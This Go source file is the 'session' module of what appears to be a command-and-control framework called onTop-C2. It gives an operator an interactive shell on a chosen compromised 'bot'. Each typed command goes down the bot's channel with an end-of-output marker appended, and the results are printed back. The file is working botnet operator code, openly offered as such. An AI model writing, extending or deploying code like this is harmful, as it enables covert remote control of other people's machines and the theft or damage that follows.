package modules

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/types"
)

var session types.Module = types.Module{
	Name: "session",
	Description: "Interact with a session (bot)",
	Options: sessionOptions,
	Execute: InteractWithSession,

}

var sessionOptions map[string]*types.Option = map[string]*types.Option{
	"BOT": {
		Name: "BOT",
		Description: "The target bot-id to handle interaction",
		Required: true,
		Value: nil,

	},

}

var interruptChannel chan struct{}
func InteractWithSession(options map[string]*types.Option, _ ...any) {
	idOption, ok := options["BOT"]
	if !ok {
		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "BOT"), true)
		return

	}

	sessionID, ok := idOption.Value.(string)
	if !ok {
		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid sessionID str (bot-00000)\n", idOption.Name), true)
		return		

	}

	var session *ListenerSession
	var exists bool

	session, exists = Sessions[sessionID]

	if !exists {
		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found session with id", sessionID), true)
		return

	}

	newErr := misc.ForceClearStdout()
	if newErr != nil {
		misc.PanicWarn(fmt.Sprintf("An error ocurred during stdout forced clear: %v", newErr), false)
		return

	}

	botIP, _ := misc.Colors(session.BotIP, "white")
	promptSignal, _ := misc.Colors("->", "white")
	endFromListener := "___END__OF__RESULT__IN__" + session.ID + "__" + session.BotIP + "___"
	signal.Stop(misc.InterruptSigs)
	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)

	misc.PrintBanner()
	misc.ChanInterruptHandler(interruptChannel)
	stdinScanner := bufio.NewScanner(os.Stdin)

	for {
		select{
		case <- interruptChannel:
			signal.Stop(misc.ChanInterruptSigs)
			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
			return

		default:
			fmt.Printf("%v %v ", botIP, promptSignal)
			ok := stdinScanner.Scan()
			misc.ChanCtrlDHandler(ok, stdinScanner.Err(), interruptChannel)

			userCommand := strings.TrimSpace(stdinScanner.Text())
			if userCommand == "" {
				continue

			}

			session.Commands <- userCommand + fmt.Sprintf("; echo; echo %v", endFromListener)

			var fullResponse []string
			var finishedPrinting bool

			for !finishedPrinting {
				select{
				case output := <-session.Outputs:
					trimOutput := strings.TrimSpace(output)
					if trimOutput == endFromListener {
						finishedPrinting = true
						break

					}

					fullResponse = append(fullResponse, trimOutput)
				
				case <-time.After(25 * time.Second):
					misc.PanicWarn(fmt.Sprintf("Error: %v\n", "Timeout waiting for response"), false)
					finishedPrinting = true

				}
			
			}

			if len(fullResponse) != 0 {
				fmt.Println(strings.Join(fullResponse, "\n"))

			}

			fmt.Print("\n")

		}

	}

}

func init() {
	RegisterNewModule(&session)
	
}